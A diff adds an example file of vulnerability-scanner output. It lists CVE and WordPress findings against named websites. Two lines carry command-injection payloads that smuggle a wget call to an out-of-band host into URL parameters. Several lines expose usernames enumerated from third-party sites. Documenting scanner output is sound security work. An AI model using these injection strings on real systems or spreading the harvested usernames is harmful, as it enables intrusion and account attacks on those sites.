@@ -1,0 +1,10 @@
+#Example of how vuln.db is output
+
+[CVE-2014-3206] [http] [critical] http://xiaoyi.com/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d08gbs2lcrb5fooff49gbjjihj7ihjshk.oast.pro;
+[CVE-2014-3206] [http] [critical] http://xiaoyi.com/backupmgt/localJob.php?session=fail;wget+http://d08gbs2lcrb5fooff49gw9ftzod7jupa8.oast.pro;
+[CVE-2021-24917] [http] [high] https://www.tenga.co.jp/wp-admin/options.php [https://www.tenga.co.jp/login_9asidiy6pkkug2hf/?redirect_to=%2Fwp-admin%2Fsomething&reauth=1]
+[wp-user-enum:usernames] [http] [low] https://www.tenga.co.jp/wp-json/wp/v2/users/ [iclip]
+[wp-user-enum:usernames] [http] [low] https://www.bujiaban.cc/wp-json/wp/v2/users/ [bjb,BJB]
+[wp-user-enum:usernames] [http] [low] https://www.lesarmoiresvides.fr/wp-json/wp/v2/users/ [lesapleines23,Aug Lem]
+[wp-user-enum:usernames] [http] [low] https://livoltek.com/wp-json/wp/v2/users/ [supervisor01,techsupport03,fayou cao,caofayou,info]
+[wp-user-enum:usernames] [http] [low] http://autoid.com/?rest_route=/wp/v2/users/ [jscinocca,mariok,Jason Scinocca,Mario Kalil]
